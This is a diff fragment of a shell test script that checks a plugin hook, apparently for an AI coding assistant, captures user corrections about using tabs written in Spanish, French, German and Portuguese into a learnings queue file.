+export CLAUDE_PLUGIN_DATA="$TEST_DATA_LANG"
+mkdir -p "$TEST_DATA_LANG/learnings"
+
+# Spanish: matches "no hagas"*
+echo '{"session_id":"test-lang-001","prompt":"no hagas eso, te dije que usaras tabs"}' | "$SCRIPTS/correction-capture.sh" 2>/dev/null
+if [ -f "$TEST_DATA_LANG/learnings/queue.jsonl" ]; then
+  COUNT=$(wc -l < "$TEST_DATA_LANG/learnings/queue.jsonl")
+  [ "$COUNT" -ge 1 ] && pass "Spanish correction captured ($COUNT entries)" || fail "Spanish correction" "not captured"
+else
+  fail "Spanish correction" "queue.jsonl not created"
+fi
+
+# French: matches "pas comme"*
+echo '{"session_id":"test-lang-001","prompt":"pas comme ça, utilise des tabs"}' | "$SCRIPTS/correction-capture.sh" 2>/dev/null
+if [ -f "$TEST_DATA_LANG/learnings/queue.jsonl" ]; then
+  COUNT=$(wc -l < "$TEST_DATA_LANG/learnings/queue.jsonl")
+  [ "$COUNT" -ge 2 ] && pass "French correction captured ($COUNT entries)" || fail "French correction" "not captured"
+fi
+
+# German: matches "nein"*
+echo '{"session_id":"test-lang-001","prompt":"nein, nicht so, verwende tabs"}' | "$SCRIPTS/correction-capture.sh" 2>/dev/null
+if [ -f "$TEST_DATA_LANG/learnings/queue.jsonl" ]; then
+  COUNT=$(wc -l < "$TEST_DATA_LANG/learnings/queue.jsonl")
+  [ "$COUNT" -ge 3 ] && pass "German correction captured ($COUNT entries)" || fail "German correction" "not captured"
+fi
+
+# Portuguese: matches *"não"*"faça"*
+echo '{"session_id":"test-lang-001","prompt":"não faça assim, use tabs"}' | "$SCRIPTS/correction-capture.sh" 2>/dev/null
+if [ -f "$TEST_DATA_LANG/learnings/queue.jsonl" ]; then
+  COUNT=$(wc -l < "$TEST_DATA_LANG/learnings/queue.jsonl")
+  [ "$COUNT" -ge 4 ] && pass "Portuguese correction captured ($COUNT entries)" || fail "Portuguese correction" "not captured"
+fi
+
+rm -rf "$TEST_DATA_LANG"
+unset CLAUDE_PLUGIN_DATA
 
 # ─────────────────────────────────────────────────────────
 header "RESULTS"
